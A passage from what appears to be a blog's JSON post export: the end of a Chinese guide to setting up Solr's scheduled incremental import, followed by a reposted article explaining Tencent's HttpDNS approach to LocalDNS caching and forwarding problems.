title=\"&#x8BBE;&#x7F6E;&#x589E;&#x91CF;&#x5BFC;&#x5165;&#x4E3A;&#x5B9A;&#x65F6;&#x6267;&#x884C;&#x7684;&#x4EFB;&#x52A1;\"></a>&#x8BBE;&#x7F6E;&#x589E;&#x91CF;&#x5BFC;&#x5165;&#x4E3A;&#x5B9A;&#x65F6;&#x6267;&#x884C;&#x7684;&#x4EFB;&#x52A1;</h3><p>&#x53EF;&#x4EE5;&#x7528;Windows&#x8BA1;&#x5212;&#x4EFB;&#x52A1;&#xFF0C;&#x6216;&#x8005;Linux&#x7684;Cron&#x6765;&#x5B9A;&#x671F;&#x8BBF;&#x95EE;&#x589E;&#x91CF;&#x5BFC;&#x5165;&#x7684;&#x8FDE;&#x63A5;&#x6765;&#x5B8C;&#x6210;&#x5B9A;&#x65F6;&#x589E;&#x91CF;&#x5BFC;&#x5165;&#x7684;&#x529F;&#x80FD;&#xFF0C;&#x8FD9;&#x5176;&#x5B9E;&#x4E5F;&#x662F;&#x53EF;&#x4EE5;&#x7684;&#xFF0C;&#x800C;&#x4E14;&#x5E94;&#x8BE5;&#x6CA1;&#x4EC0;&#x4E48;&#x95EE;&#x9898;&#x3002;</p>\n<p>&#x4F46;&#x662F;&#x66F4;&#x65B9;&#x4FBF;&#xFF0C;&#x66F4;&#x52A0;&#x4E0E;Solr&#x672C;&#x8EAB;&#x96C6;&#x6210;&#x5EA6;&#x9AD8;&#x7684;&#x662F;&#x5229;&#x7528;&#x5176;&#x81EA;&#x8EAB;&#x7684;&#x5B9A;&#x65F6;&#x589E;&#x91CF;&#x5BFC;&#x5165;&#x529F;&#x80FD;&#x3002;</p>\n<p>1&#x3001;&#x4E0B;&#x8F7D;apache-solr-dataimportscheduler-1.0.jar&#x653E;&#x5230;\\solr-webapp\\webapp\\WEB-INF\\lib&#x76EE;&#x5F55;&#x4E0B;&#xFF1A;<br>&#x4E0B;&#x8F7D;&#x5730;&#x5740;&#xFF1A;<a href=\"http://code.google.com/p/solr-dataimport-scheduler/downloads/list\">http://code.google.com/p/solr-dataimport-scheduler/downloads/list</a><br>&#x4E5F;&#x53EF;&#x4EE5;&#x5230;&#x767E;&#x5EA6;&#x4E91;&#x76D8;&#x4E0B;&#x8F7D;&#xFF1A;<a href=\"http://pan.baidu.com/s/1dDw0MRn\">http://pan.baidu.com/s/1dDw0MRn</a></p>\n<p>&#x6CE8;&#x610F;&#xFF1A;apache-solr-dataimportscheduler-1.0.jar&#x6709;bug&#xFF0C;&#x53C2;&#x8003;&#xFF1A;<a href=\"http://www.denghuafeng.com/post-242.html\">http://www.denghuafeng.com/post-242.html</a></p>\n<p>2&#x3001;&#x4FEE;&#x6539;solr&#x7684;WEB-INF&#x76EE;&#x5F55;&#x4E0B;&#x9762;&#x7684;web.xml&#x6587;&#x4EF6;&#xFF1A;<br>&#x4E3A;<web-app>&#x5143;&#x7D20;&#x6DFB;&#x52A0;&#x4E00;&#x4E2A;&#x5B50;&#x5143;&#x7D20;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;listener&gt;</span><br><span class=\"line\">        &lt;listener-class&gt;</span><br><span class=\"line\">    org.apache.solr.handler.dataimport.scheduler.ApplicationListener</span><br><span class=\"line\">        &lt;/listener-class&gt;</span><br><span class=\"line\">    &lt;/listener&gt;</span><br></pre></td></tr></table></figure></web-app></p>\n<p>3&#x3001;&#x65B0;&#x5EFA;&#x914D;&#x7F6E;&#x6587;&#x4EF6;dataimport.properties&#xFF1A;</p>\n<p>&#x5728;SOLR_HOME\\solr&#x76EE;&#x5F55;&#x4E0B;&#x9762;&#x65B0;&#x5EFA;&#x4E00;&#x4E2A;&#x76EE;&#x5F55;conf&#xFF08;&#x6CE8;&#x610F;&#x4E0D;&#x662F;SOLR_HOME\\solr\\collection1&#x4E0B;&#x9762;&#x7684;conf&#xFF09;&#xFF0C;&#x7136;&#x540E;&#x7528;&#x89E3;&#x538B;&#x6587;&#x4EF6;&#x6253;&#x5F00;apache-solr-dataimportscheduler-1.0.jar&#x6587;&#x4EF6;&#xFF0C;&#x5C06;&#x91CC;&#x9762;&#x7684;dataimport.properties&#x6587;&#x4EF6;&#x62F7;&#x8D1D;&#x8FC7;&#x6765;&#xFF0C;&#x8FDB;&#x884C;&#x4FEE;&#x6539;&#xFF0C;&#x4E0B;&#x9762;&#x662F;&#x6700;&#x7EC8;&#x6211;&#x7684;&#x81EA;&#x52A8;&#x5B9A;&#x65F6;&#x66F4;&#x65B0;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x5185;&#x5BB9;&#xFF1A;</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#################################################</span></span><br><span class=\"line\"><span class=\"comment\">#                                               #</span></span><br><span class=\"line\"><span class=\"comment\">#       dataimport scheduler properties         #</span></span><br><span class=\"line\"><span class=\"comment\">#                                               #</span></span><br><span class=\"line\"><span class=\"comment\">#################################################</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#  to sync or not to sync</span></span><br><span class=\"line\"><span class=\"comment\">#  1 - active; anything else - inactive</span></span><br><span class=\"line\">syncEnabled=1</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#  which cores to schedule</span></span><br><span class=\"line\"><span class=\"comment\">#  in a multi-core environment you can decide which cores you want syncronized</span></span><br><span class=\"line\"><span class=\"comment\">#  leave empty or comment it out if using single-core deployment</span></span><br><span class=\"line\"><span class=\"comment\">#  syncCores=game,resource</span></span><br><span class=\"line\">syncCores=collection1</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#  solr server name or IP address</span></span><br><span class=\"line\"><span class=\"comment\">#  [defaults to localhost if empty]</span></span><br><span class=\"line\">server=localhost</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#  solr server port</span></span><br><span class=\"line\"><span class=\"comment\">#  [defaults to 80 if empty]</span></span><br><span class=\"line\">port=8983</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#  application name/context</span></span><br><span class=\"line\"><span class=\"comment\">#  [defaults to current ServletContextListener&apos;s context (app) name]</span></span><br><span class=\"line\">webapp=solr</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#  URLparams [mandatory]</span></span><br><span class=\"line\"><span class=\"comment\">#  remainder of URL</span></span><br><span class=\"line\"><span class=\"comment\">#http://localhost:8983/solr/collection1/dataimport?command=delta-import&amp;clean=false&amp;commit=true</span></span><br><span class=\"line\">params=/dataimport?<span class=\"built_in\">command</span>=delta-import&amp;clean=<span class=\"literal\">false</span>&amp;commit=<span class=\"literal\">true</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#  schedule interval</span></span><br><span class=\"line\"><span class=\"comment\">#  number of minutes between two runs</span></span><br><span class=\"line\"><span class=\"comment\">#  [defaults to 30 if empty]</span></span><br><span class=\"line\">interval=1</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#  &#x91CD;&#x505A;&#x7D22;&#x5F15;&#x7684;&#x65F6;&#x95F4;&#x95F4;&#x9694;&#xFF0C;&#x5355;&#x4F4D;&#x5206;&#x949F;&#xFF0C;&#x9ED8;&#x8BA4;7200&#xFF0C;&#x5373;1&#x5929;; </span></span><br><span class=\"line\"><span class=\"comment\">#  &#x4E3A;&#x7A7A;,&#x4E3A;0,&#x6216;&#x8005;&#x6CE8;&#x91CA;&#x6389;:&#x8868;&#x793A;&#x6C38;&#x4E0D;&#x91CD;&#x505A;&#x7D22;&#x5F15;</span></span><br><span class=\"line\"><span class=\"comment\"># reBuildIndexInterval=2</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#  &#x91CD;&#x505A;&#x7D22;&#x5F15;&#x7684;&#x53C2;&#x6570;</span></span><br><span class=\"line\">reBuildIndexParams=/dataimport?<span class=\"built_in\">command</span>=full-import&amp;clean=<span class=\"literal\">true</span>&amp;commit=<span class=\"literal\">true</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#  &#x91CD;&#x505A;&#x7D22;&#x5F15;&#x65F6;&#x95F4;&#x95F4;&#x9694;&#x7684;&#x8BA1;&#x65F6;&#x5F00;&#x59CB;&#x65F6;&#x95F4;&#xFF0C;&#x7B2C;&#x4E00;&#x6B21;&#x771F;&#x6B63;&#x6267;&#x884C;&#x7684;&#x65F6;&#x95F4;=reBuildIndexBeginTime+reBuildIndexInterval*60*1000&#xFF1B;</span></span><br><span class=\"line\"><span class=\"comment\">#  &#x4E24;&#x79CD;&#x683C;&#x5F0F;&#xFF1A;2012-04-11 03:10:00 &#x6216;&#x8005;  03:10:00&#xFF0C;&#x540E;&#x4E00;&#x79CD;&#x4F1A;&#x81EA;&#x52A8;&#x8865;&#x5168;&#x65E5;&#x671F;&#x90E8;&#x5206;&#x4E3A;&#x670D;&#x52A1;&#x542F;&#x52A8;&#x65F6;&#x7684;&#x65E5;&#x671F;</span></span><br><span class=\"line\">reBuildIndexBeginTime=03:10:00</span><br></pre></td></tr></table></figure>\n<p>&#x8FD9;&#x91CC;&#x4E3A;&#x4E86;&#x505A;&#x6D4B;&#x8BD5;&#x6BCF;1&#x5206;&#x949F;&#x5C31;&#x8FDB;&#x884C;&#x4E00;&#x6B21;&#x589E;&#x91CF;&#x7D22;&#x5F15;&#xFF0C;&#x540C;&#x65F6;disable&#x4E86;full-import&#x5168;&#x91CF;&#x7D22;&#x5F15;&#x3002;</p>\n<p>4&#x3001;&#x6D4B;&#x8BD5;</p>\n<p>&#x5728;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x63D2;&#x5165;&#x4E00;&#x6761;&#x6570;&#x636E;&#xFF0C;&#x5728;Solr Query&#x4E2D;&#x67E5;&#x8BE2;&#xFF0C;&#x521A;&#x5F00;&#x59CB;&#x67E5;&#x4E0D;&#x5230;&#xFF0C;Solr&#x8FDB;&#x884C;&#x4E00;&#x6B21;&#x589E;&#x91CF;&#x7D22;&#x5F15;&#x540E;&#x5C31;&#x53EF;&#x4EE5;&#x67E5;&#x8BE2;&#x5230;&#x4E86;&#x3002;</p>\n<p>&#x4E00;&#x822C;&#x6765;&#x8BF4;&#x8981;&#x5728;&#x4F60;&#x7684;&#x9879;&#x76EE;&#x4E2D;&#x5F15;&#x5165;Solr&#x9700;&#x8981;&#x8003;&#x8651;&#x4EE5;&#x4E0B;&#x51E0;&#x70B9;&#xFF1A;<br>1&#x3001;&#x6570;&#x636E;&#x66F4;&#x65B0;&#x9891;&#x7387;&#xFF1A;&#x6BCF;&#x5929;&#x6570;&#x636E;&#x589E;&#x91CF;&#x6709;&#x591A;&#x5927;&#xFF0C;&#x53CA;&#x65F6;&#x66F4;&#x65B0;&#x8FD8;&#x662F;&#x5B9A;&#x65F6;&#x66F4;&#x65B0;<br>2&#x3001;&#x6570;&#x636E;&#x603B;&#x91CF;&#xFF1A;&#x6570;&#x636E;&#x8981;&#x4FDD;&#x5B58;&#x591A;&#x957F;&#x65F6;&#x95F4;<br>3&#x3001;&#x4E00;&#x81F4;&#x6027;&#x8981;&#x6C42;&#xFF1A;&#x671F;&#x671B;&#x591A;&#x957F;&#x65F6;&#x95F4;&#x5185;&#x770B;&#x5230;&#x66F4;&#x65B0;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x6700;&#x957F;&#x5141;&#x8BB8;&#x591A;&#x957F;&#x65F6;&#x95F4;&#x5EF6;&#x8FDF;<br>4&#x3001;&#x6570;&#x636E;&#x7279;&#x70B9;&#xFF1A;&#x6570;&#x636E;&#x6E90;&#x5305;&#x62EC;&#x54EA;&#x4E9B;&#xFF0C;&#x5E73;&#x5747;&#x5355;&#x6761;&#x8BB0;&#x5F55;&#x5927;&#x5C0F;<br>5&#x3001;&#x4E1A;&#x52A1;&#x7279;&#x70B9;&#xFF1A;&#x6709;&#x54EA;&#x4E9B;&#x6392;&#x5E8F;&#x8981;&#x6C42;&#xFF0C;&#x68C0;&#x7D22;&#x6761;&#x4EF6;<br>6&#x3001;&#x8D44;&#x6E90;&#x590D;&#x7528;&#xFF1A;&#x5DF2;&#x6709;&#x7684;&#x786C;&#x4EF6;&#x914D;&#x7F6E;&#x662F;&#x600E;&#x6837;&#x7684;&#xFF0C;&#x662F;&#x5426;&#x6709;&#x5347;&#x7EA7;&#x8BA1;&#x5212;</p>"},{"title":"全局精确流量调度新思路-HttpDNS服务详解","date":"2016-05-26T14:22:00.000Z","toc":false,"_content":"\n但凡使用域名来给用户提供服务的互联网企业，都或多或少地无法避免在有中国特色的互联网环境中遭遇到各种域名被缓存、用户跨网访问缓慢等问题。那么对于腾讯这样的域名数量在10万级别的互联网公司来讲，域名解析异常的情况到底有多严重呢？每天腾讯的分布式域名解析监测系统在不停地对全国所有的重点LocalDNS进行探测，腾讯域名在全国各地的日解析异常量是已经超过了80万条。这给腾讯的业务带来了巨大的损失。为此腾讯建立了专业的团队与各个运营商进行了深度沟通，但是由于各种原因，处理效率及效果均不能达到腾讯各业务部门的需求。除了和运营商进行沟通，有没有一种技术上的方案，能从根源上解决域名解析异常及用户访问跨网的问题呢？\n\n## 一、问题根源：\n\n要解决问题，我们得先得了解下现在国内各ISP的LocalDNS的基本情况。国内运营商LocalDNS造成的用户访问异常可以归为下三类：\n\n### 1、域名缓存：\n\n域名缓存很好理解，就是LocalDNS缓存了腾讯的域名的解析结果，不向腾讯权威DNS发起递归，示意图如下：  \n\n![图片1](http://7xvfir.com1.z0.glb.clouddn.com/%E5%85%A8%E5%B1%80%E7%B2%BE%E7%A1%AE%E6%B5%81%E9%87%8F%E8%B0%83%E5%BA%A6%E6%96%B0%E6%80%9D%E8%B7%AF-HttpDNS%E6%9C%8D%E5%8A%A1%E8%AF%A6%E8%A7%A3/1.jpg)  \n\n为何LocalDNS要把域名解析结果进行缓存呢？原因有以下几个：\n\n（1）保证用户访问流量在本网内消化：国内的各互联网接入运营商的带宽资源、网间结算费用、IDC机房分布、网内ICP资源分布等存在较大差异。为了保证网内用户的访问质量，同时减少跨网结算，运营商在网内搭建了内容缓存服务器，通过把域名强行指向内容缓存服务器的IP地址，就实现了把本地本网流量完全留在了本地的目的。\n\n<!--more-->\n\n（2）推送广告：有部分LocalDNS会把部分域名解析结果的所指向的内容缓存，并替换成第三方广告联盟的广告。\n\n这种类型的行为就是我们常说的域名缓存，域名缓存会导致用户产生以下的访问异常：\n\nA、仅对80端口的http服务做了缓存，如果域名是通过https协议或其它端口提供服务的，用户访问就会出现失败。比如支付服务、游戏通过指定端口连接connect server服务等。\n\nB、缓存服务器的运维水平参差不齐，时有出现缓存服务器故障导致用户访问异常的问题。\n\n### 2、解析转发：\n\n除了域名缓存以外，运营商的LocalDNS还存在解析转发的现象。解析转发是指运营商自身不进行域名递归解析，而是把域名解析请求转发到其它运营商的递归DNS上的行为。正常的LocalDNS递归解析过程是这样的：\n\n![图片2](http://7xvfir.com1.z0.glb.clouddn.com/%E5%85%A8%E5%B1%80%E7%B2%BE%E7%A1%AE%E6%B5%81%E9%87%8F%E8%B0%83%E5%BA%A6%E6%96%B0%E6%80%9D%E8%B7%AF-HttpDNS%E6%9C%8D%E5%8A%A1%E8%AF%A6%E8%A7%A3/2.jpg)  \n\n\n而部分小运营商为了节省资源，就直接将解析请求转发到了其它运营的递归LocalDNS上去了：\n\n![图片3](http://7xvfir.com1.z0.glb.clouddn.com/%E5%85%A8%E5%B1%80%E7%B2%BE%E7%A1%AE%E6%B5%81%E9%87%8F%E8%B0%83%E5%BA%A6%E6%96%B0%E6%80%9D%E8%B7%AF-HttpDNS%E6%9C%8D%E5%8A%A1%E8%AF%A6%E8%A7%A3/3.jpg)  \n\n\n这样的直接后果就是腾讯权威DNS收到的域名解析请求的来源IP就成了其它运营商的IP，最终导致用户流量被导向了错误的IDC，用户访问变慢。\n\n### 3、LocalDNS递归出口NAT：\n\nLocalDNS递归出口NAT指的是运营商的LocalDNS按照标准的DNS协议进行递归，但是因为在网络上存在多出口且配置了目标路由NAT，结果导致LocalDNS最终进行递归解析的时候的出口IP就有概率不为本网的IP地址：\n\n![图片4](http://7xvfir.com1.z0.glb.clouddn.com/%E5%85%A8%E5%B1%80%E7%B2%BE%E7%A1%AE%E6%B5%81%E9%87%8F%E8%B0%83%E5%BA%A6%E6%96%B0%E6%80%9D%E8%B7%AF-HttpDNS%E6%9C%8D%E5%8A%A1%E8%AF%A6%E8%A7%A3/4.jpg)  \n\n\n这样的直接后果就是GSLB DNS收到的域名解析请求的来源IP还是成了其它运营商的IP，最终导致用户流量被导向了错误的IDC，用户访问变慢。\n\n## 二、现有的解决方案及存在的问题：\n\n运营商的LocalDNS解析域名异常，给对用户访问腾讯业务的体验造成了非常大的损害。那么我们是如何处理这些域名解析异常的问题的呢？\n\n### 1、实时监控+商务推动：\n\n这种方案是目前腾讯的运营团队一直在使用的方案。这种方案就是周期比较长，毕竟通过行政手段来推动运营商来解决这个问题是比较耗时的。另外我们通过大数据分析，得出的结论是Top 3的问题用户均为移动互联网用户。对于这部分用户，我们有什么技术手段可以解决以上的问题呢？\n\n### 2、绕过自动分配DNS，使用114dns或Google public DNS：\n\n这个方案看上去很美好，114dns是国内最大的中立缓存DNS，而Google又是秉承不作恶理念的互联网工程帝国巨鳄，而且腾讯的权威DNS又支持edns-client-subnet功能，能直接识别使用Google publicDNS解析腾讯域名的用户的IP地址，不会出现流量调度失效。但是问题来了：\n\n（1）如何在用户侧构造域名请求：对于PC端的客户端来说，构造一个标准的DNS请求包并不算什么难事。但在移动端要向一个指定的LocalDNS上发送标准的DNS请求包，而且要兼容各种iOS和Android的版本的话，技术上是可行的，只是兼容的成本会很高。\n\n（2）推动用户修改配置极高：如果要推动用户手动修改PC的DNS配置的话，在PC端和手机客户端的WiFI下面还算勉强可行。但是要用户修改在移动互联网环境下的DNS配置，其难度不言而喻。\n\n### 3、完全抛弃域名，自建connectcenter进行流量调度：\n\n如果要采用这种这种方案的话，首先你就得要拿到一份准确的IP地址库来判断用户的归属，然后再制定个协议搭个connect center来做调度，然后再对接入层做调度改造。这种方案和2种方案一样，不是不能做，只是成本会比较高，尤其对于腾讯这种业务规模如此庞大的公司而言。\n\n## 三、利用HttpDNS解决用户域名解析异常：\n\n既然上面的方案都存在那么多的问题，那有没有一种调度精准、成本低廉、配置方便的基于域名的流量调度系统呢？答案是肯定的。腾讯公司的GSLB 团队推出了一种全新的域名解析调度系统：HttpDNS。HttpDNS是为移动客户端量身定做的基于Http协议和域名解析的流量调度解决方案，专治LocalDNS解析异常以及流量调度不准。详细介绍如下：\n\n### 1、HttpDNS基本原理：\n\n![图片5](http://7xvfir.com1.z0.glb.clouddn.com/%E5%85%A8%E5%B1%80%E7%B2%BE%E7%A1%AE%E6%B5%81%E9%87%8F%E8%B0%83%E5%BA%A6%E6%96%B0%E6%80%9D%E8%B7%AF-HttpDNS%E6%9C%8D%E5%8A%A1%E8%AF%A6%E8%A7%A3/5.jpg)  \n\n\nHttpDNS的原理非常简单，主要有两步：\n\nA、客户端直接访问HttpDNS接口，获取业务在域名配置管理系统上配置的访问延迟最优的IP。（基于容灾考虑，还是保留次选使用运营商LocalDNS解析域名的方式）\n\nB、客户端向获取到的IP后就向直接往此IP发送业务协议请求。以Http请求为例，通过在header中指定host字段，向HttpDNS返回的IP发送标准的Http请求即可。\n\n### 2、HttpDNS优势：\n\n从原理上来讲，HttpDNS只是将域名解析的协议由DNS协议换成了Http协议，并不复杂。但是这一微小的转换，却带来了无数的收益：\n\nA、根治域名解析异常：由于绕过了运营商的LocalDNS，用户解析域名的请求通过Http协议直接透传到了腾讯的HttpDNS服务器IP上，用户在客户端的域名解析请求将不会遭受到域名解析异常的困扰。\n\nB、调度精准：HttpDNS能直接获取到用户IP，通过结合腾讯自有专利技术生成的IP地址库以及测速系统，可以保证将用户引导的访问最快的IDC节点上。\n\nC、实现成本低廉：接入HttpDNS的业务仅需要对客户端接入层做少量改造，无需用户手机进行root或越狱；而且由于Http协议请求构造非常简单，兼容各版本的移动操作系统更不成问题；另外HttpDNS的后端配置完全复用现有权威DNS配置，管理成本也非常低。总而言之，就是以最小的改造成本，解决了业务遭受域名解析异常的问题，并满足业务精确流量调度的需求。\n\nD、扩展性强：HttpDNS提供可靠的域名解析服务，业务可将自有调度逻辑与HttpDNS返回结果结合，实现更精细化的流量调度。比如指定版本的客户端连接请求的IP地址，指定网络类型的用户连接指定的IP地址等。\n\n当然各位可能会问：用户将首选的域名解析方式切换到了HttpDNS，那么HttpDNS的高可用又是如何保证的呢？另外不同运营商的用户访问到同一个HttpDNS的服务IP，用户的访问延迟如何保证？\n\n为了保证高可用及提升用户体验，HttpDNS通过接入了腾讯公网交换平台的BGP Anycast网络，与全国多个主流运营商建立了BGP互联，保证了这些运营商的用户能够快速地访问到HttpDNS服务；另外HttpDNS在多个数据中心进行了部署，任意一个节点发生故障时均能无缝切换到备份节点，保证用户解析正常。\n\n## 四、接入效果及未来展望：\n\n当前HttpDNS已在腾讯内部接入了多个业务，覆盖数亿用户，并已持续稳定运行超过一年时间。而接入了HttpDNS的业务在用户访问体验方面都有了非常大的提升。以某个接入HttpDNS的业务为例，该业务仅通过接入HttpDNS，在未做任何其它优化的情况下，用户平均访问延迟下降超过10%，访问失败率下降了超过五分之一，用户访问体验的效果提升非常显著。另外腾讯的HttpDNS服务除了在腾讯内部被广泛使用以外，也受到了业务同行的肯定。国内最大的publicDNS服务商114dns在受到腾讯DNS的启发下，也推出了HttpDNS服务。\n\n在未来的日子里，腾讯GSLB团队将会在腾讯内部进一步推广HttpDNS服务，并将在实际业务的需求下对HttpDNS服务进行升级，如提供更为通用、安全、简单的接入协议，进一步提升接入用户的网络访问体验等等。希望HttpDNS能为各位在解决域名解析异常及全局流量调度失效方面提供一个简单、可行的思路，也欢迎各位业界同行与腾讯一起，就如何进行更精准的全局流量调度方面进行更为深入的讨论。\n\n原文链接：http://www.zmke.com/i/8705.html","source":"_posts/全局精确流量调度新思路-HttpDNS服务详解.md","raw":"---\ntitle: 全局精确流量调度新思路-HttpDNS服务详解\ntags:\n  - HttpsDNS\ncategories:\n  - 我的收藏\ndate: 2016-5-26 22:22:00\ntoc: false\n---\n\n但凡使用域名来给用户提供服务的互联网企业，都或多或少地无法避免在有中国特色的互联网环境中遭遇到各种域名被缓存、用户跨网访问缓慢等问题。那么对于腾讯这样的域名数量在10万级别的互联网公司来讲，域名解析异常的情况到底有多严重呢？每天腾讯的分布式域名解析监测系统在不停地对全国所有的重点LocalDNS进行探测，腾讯域名在全国各地的日解析异常量是已经超过了80万条。这给腾讯的业务带来了巨大的损失。为此腾讯建立了专业的团队与各个运营商进行了深度沟通，但是由于各种原因，处理效率及效果均不能达到腾讯各业务部门的需求。除了和运营商进行沟通，有没有一种技术上的方案，能从根源上解决域名解析异常及用户访问跨网的问题呢？\n\n## 一、问题根源：\n\n要解决问题，我们得先得了解下现在国内各ISP的LocalDNS的基本情况。国内运营商LocalDNS造成的用户访问异常可以归为下三类：\n\n### 1、域名缓存：\n\n域名缓存很好理解，就是LocalDNS缓存了腾讯的域名的解析结果，不向腾讯权威DNS发起递归，示意图如下：  \n\n![图片1](http://7xvfir.com1.z0.glb.clouddn.com/%E5%85%A8%E5%B1%80%E7%B2%BE%E7%A1%AE%E6%B5%81%E9%87%8F%E8%B0%83%E5%BA%A6%E6%96%B0%E6%80%9D%E8%B7%AF-HttpDNS%E6%9C%8D%E5%8A%A1%E8%AF%A6%E8%A7%A3/1.jpg)  \n\n为何LocalDNS要把域名解析结果进行缓存呢？原因有以下几个：\n\n（1）保证用户访问流量在本网内消化：国内的各互联网接入运营商的带宽资源、网间结算费用、IDC机房分布、网内ICP资源分布等存在较大差异。为了保证网内用户的访问质量，同时减少跨网结算，运营商在网内搭建了内容缓存服务器，通过把域名强行指向内容缓存服务器的IP地址，就实现了把本地本网流量完全留在了本地的目的。\n\n<!--more-->\n\n（2）推送广告：有部分LocalDNS会把部分域名解析结果的所指向的内容缓存，并替换成第三方广告联盟的广告。\n\n这种类型的行为就是我们常说的域名缓存，域名缓存会导致用户产生以下的访问异常：\n\nA、仅对80端口的http服务做了缓存，如果域名是通过https协议或其它端口提供服务的，用户访问就会出现失败。比如支付服务、游戏通过指定端口连接connect server服务等。\n\nB、缓存服务器的运维水平参差不齐，时有出现缓存服务器故障导致用户访问异常的问题。\n\n### 2、解析转发：\n\n除了域名缓存以外，运营商的LocalDNS还存在解析转发的现象。解析转发是指运营商自身不进行域名递归解析，而是把域名解析请求转发到其它运营商的递归DNS上的行为。正常的LocalDNS递归解析过程是这样的：\n\n![图片2](http://7xvfir.com1.z0.glb.clouddn.com/%E5%85%A8%E5%B1%80%E7%B2%BE%E7%A1%AE%E6%B5%81%E9%87%8F%E8%B0%83%E5%BA%A6%E6%96%B0%E6%80%9D%E8%B7%AF-HttpDNS%E6%9C%8D%E5%8A%A1%E8%AF%A6%E8%A7%A3/2.jpg)  \n\n\n而部分小运营商为了节省资源，就直接将解析请求转发到了其它运营的递归LocalDNS上去了：\n\n![图片3](http://7xvfir.com1.z0.glb.clouddn.com/%E5%85%A8%E5%B1%80%E7%B2%BE%E7%A1%AE%E6%B5%81%E9%87%8F%E8%B0%83%E5%BA%A6%E6%96%B0%E6%80%9D%E8%B7%AF-HttpDNS%E6%9C%8D%E5%8A%A1%E8%AF%A6%E8%A7%A3/3.jpg)  \n\n\n这样的直接后果就是腾讯权威DNS收到的域名解析请求的来源IP就成了其它运营商的IP，最终导致用户流量被导向了错误的IDC，用户访问变慢。\n\n### 3、LocalDNS递归出口NAT：\n\nLocalDNS递归出口NAT指的是运营商的LocalDNS按照标准的DNS协议进行递归，但是因为在网络上存在多出口且配置了目标路由NAT，结果导致LocalDNS最终进行递归解析的时候的出口IP就有概率不为本网的IP地址：\n\n![图片4](http://7xvfir.com1.z0.glb.clouddn.com/%E5%85%A8%E5%B1%80%E7%B2%BE%E7%A1%AE%E6%B5%81%E9%87%8F%E8%B0%83%E5%BA%A6%E6%96%B0%E6%80%9D%E8%B7%AF-HttpDNS%E6%9C%8D%E5%8A%A1%E8%AF%A6%E8%A7%A3/4.jpg)  \n\n\n这样的直接后果就是GSLB DNS收到的域名解析请求的来源IP还是成了其它运营商的IP，最终导致用户流量被导向了错误的IDC，用户访问变慢。\n\n## 二、现有的解决方案及存在的问题：\n\n运营商的LocalDNS解析域名异常，给对用户访问腾讯业务的体验造成了非常大的损害。那么我们是如何处理这些域名解析异常的问题的呢？\n\n### 1、实时监控+商务推动：\n\n这种方案是目前腾讯的运营团队一直在使用的方案。这种方案就是周期比较长，毕竟通过行政手段来推动运营商来解决这个问题是比较耗时的。另外我们通过大数据分析，得出的结论是Top 3的问题用户均为移动互联网用户。对于这部分用户，我们有什么技术手段可以解决以上的问题呢？\n\n### 2、绕过自动分配DNS，使用114dns或Google public DNS：\n\n这个方案看上去很美好，114dns是国内最大的中立缓存DNS，而Google又是秉承不作恶理念的互联网工程帝国巨鳄，而且腾讯的权威DNS又支持edns-client-subnet功能，能直接识别使用Google publicDNS解析腾讯域名的用户的IP地址，不会出现流量调度失效。但是问题来了：\n\n（1）如何在用户侧构造域名请求：对于PC端的客户端来说，构造一个标准的DNS请求包并不算什么难事。但在移动端要向一个指定的LocalDNS上发送标准的DNS请求包，而且要兼容各种iOS和Android的版本的话，技术上是可行的，只是兼容的成本会很高。\n\n（2）推动用户修改配置极高：如果要推动用户手动修改PC的DNS配置的话，在PC端和手机客户端的WiFI下面还算勉强可行。但是要用户修改在移动互联网环境下的DNS配置，其难度不言而喻。\n\n### 3、完全抛弃域名，自建connectcenter进行流量调度：\n\n如果要采用这种这种方案的话，首先你就得要拿到一份准确的IP地址库来判断用户的归属，然后再制定个协议搭个connect center来做调度，然后再对接入层做调度改造。这种方案和2种方案一样，不是不能做，只是成本会比较高，尤其对于腾讯这种业务规模如此庞大的公司而言。\n\n## 三、利用HttpDNS解决用户域名解析异常：\n\n既然上面的方案都存在那么多的问题，那有没有一种调度精准、成本低廉、配置方便的基于域名的流量调度系统呢？答案是肯定的。腾讯公司的GSLB 